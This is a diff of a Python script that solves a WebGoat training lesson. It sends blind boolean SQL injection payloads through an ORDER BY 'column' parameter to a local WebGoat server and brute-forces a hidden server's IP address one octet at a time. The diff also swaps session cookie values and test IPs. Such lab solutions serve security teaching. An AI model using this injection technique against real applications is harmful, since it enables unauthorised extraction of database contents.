@@ -8,7 +8,7 @@ WebGoatIP = '127.0.0.1:8080'
 # Type getServers(ip) on Browser console to get the URL to the XHR GET request
 # http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=ip
 URL = 'http://{}/WebGoat/SqlInjectionMitigations/servers?column={}' #FIXME
-JSESSIONID = '50x138L73ufvLGgzsj2z3BmRVLmsr7XVfMvsF6eD' #FIXME
+JSESSIONID = '9VB5OXJsdEaopr9JfPeoZg11_WWKmdM7MkISnyMY' #FIXME
 
 regEx = re.compile('\* [0-9]+\-[0-9]+')
 
@@ -58,7 +58,7 @@ def test():
     #sortBy = 'hostname'
     # change webgoat-pre-prod ip with correct and incorrect and see the result
     # see how test() function works
-    pre_prod_ip = '192.168.6.10' # FIXME change it to correct and incorrect
+    pre_prod_ip = '192.168.6.4' # FIXME change it to correct and incorrect
     sortBy = f"(case when (select ip from servers where hostname='webgoat-pre-prod') = '{pre_prod_ip}' then id else hostname end)"
 	# this is true; so sort by id; also we confirmed that servers table exists
     if getRequest(sortBy, True):
@@ -73,10 +73,10 @@ def bruteForce():
     id else hostname end)
     """
     for i in range(1, 255): # check for values between 1 and 254 .130.219.202
-        ip = '{}.130.219.202'.format(i)
-        if getRequest(sortBy.format(ip), False):
+        ip = f'{i}.130.219.202'
+        if getRequest(sortBy.format(ip), True):
             print('Success!')
-            print('The ip address is {}'.format(ip))
+            print(f'The ip address is {ip}')
             break
 
 
